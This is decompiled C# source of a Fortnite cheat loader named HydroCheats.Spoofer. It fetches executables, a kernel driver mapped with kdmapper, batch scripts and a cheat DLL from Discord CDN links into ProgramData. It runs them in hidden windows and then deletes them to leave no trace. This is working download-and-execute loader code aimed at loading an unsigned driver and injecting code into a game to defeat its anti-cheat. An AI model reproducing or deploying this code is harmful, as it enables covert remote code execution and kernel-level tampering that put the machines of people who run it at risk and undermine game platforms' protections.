// Decompiled with JetBrains decompiler
// Type: HydroCheats.Spoofer
// Assembly: Loader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 21BEF00F-328C-44A0-AD30-584899C00B25
// Assembly location: C:\Users\sucht\Downloads\axelfn.exe

using System;
using System.Diagnostics;
using System.Net;
using System.Security.Principal;
using System.Threading;

namespace HydroCheats
{
  internal class Spoofer
  {
    private static string Clean = WindowsIdentity.GetCurrent().User.Value;
    private static string Inject = WindowsIdentity.GetCurrent().User.Value;

    public static void Woof()
    {
      WebClient webClient = new WebClient();
      string str1 = "";
      string str2 = "";
      webClient.DownloadFile("", str1);
      webClient.DownloadFile("", str2);
      Process process1 = new Process()
      {
        StartInfo = {
          FileName = "cmd.exe",
          UseShellExecute = true,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        }
      };
      Process process2 = Process.Start(str1, str2);
      Thread.Sleep(1000);
      process2.Close();
      System.IO.File.Delete(str1);
    }

    public static void Cleaner(string loc)
    {
      WebClient webClient = new WebClient();
      string str = "C:\\Cheat\\test";
      string fileName = str;
      webClient.DownloadFile("https://cdn.discordapp.com/attachments/757635472561537118/762206550236200980/CorixClean.exe", fileName);
      Process process1 = new Process()
      {
        StartInfo = {
          FileName = "cmd.exe",
          UseShellExecute = true,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        }
      };
      Process process2 = Process.Start(str);
      Thread.Sleep(1000);
      process2.Close();
      System.IO.File.Delete(str);
    }

    internal static void Injecter()
    {
      WebClient webClient1 = new WebClient();
      string str1 = "C:\\ProgramData\\ImeBrokerc.exe";
      string str2 = "C:\\ProgramData\\driver.sys";
      string str3 = "C:\\ProgramData\\Map.bat";
      webClient1.DownloadFile("https://cdn.discordapp.com/attachments/755919736142823465/755919792283844740/kdmapper.exe", str1);
      webClient1.DownloadFile("https://cdn.discordapp.com/attachments/755919736142823465/755919793068048414/driver.sys", str2);
      webClient1.DownloadFile("https://cdn.discordapp.com/attachments/756150630657163325/759635701703639041/Map.bat", str3);
      Process process1 = new Process()
      {
        StartInfo = {
          FileName = "cmd.exe",
          UseShellExecute = true,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        }
      };
      Process process2 = Process.Start(str3);
      Thread.Sleep(2000);
      process2.Close();
      System.IO.File.Delete(str1);
      System.IO.File.Delete(str2);
      System.IO.File.Delete(str3);
      Console.Clear();
      Console.WriteLine();
      Console.Write(" Press any key when in fortnite lobby");
      Console.ReadKey();
      WebClient webClient2 = new WebClient();
      string str4 = "C:\\ProgramData\\ime.exe";
      string str5 = "C:\\ProgramData\\imecfmc.dll";
      string str6 = "C:\\ProgramData\\Inject.bat";
      webClient1.DownloadFile("https://cdn.discordapp.com/attachments/755919736142823465/755919840279003136/modmap.exe", str4);
      webClient1.DownloadFile("https://cdn.discordapp.com/attachments/757635472561537118/762213029768331264/Fortnite.dll", str5);
      webClient1.DownloadFile("https://cdn.discordapp.com/attachments/756150630657163325/756192343622811669/Inject.bat", str6);
      Process process3 = new Process();
      process2.StartInfo.FileName = "cmd.exe";
      process2.StartInfo.UseShellExecute = true;
      process2.StartInfo.CreateNoWindow = true;
      process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      Process.Start(str6);
      Thread.Sleep(2000);
      process2.Close();
      System.IO.File.Delete(str4);
      System.IO.File.Delete(str5);
      System.IO.File.Delete(str6);
    }
  }
}
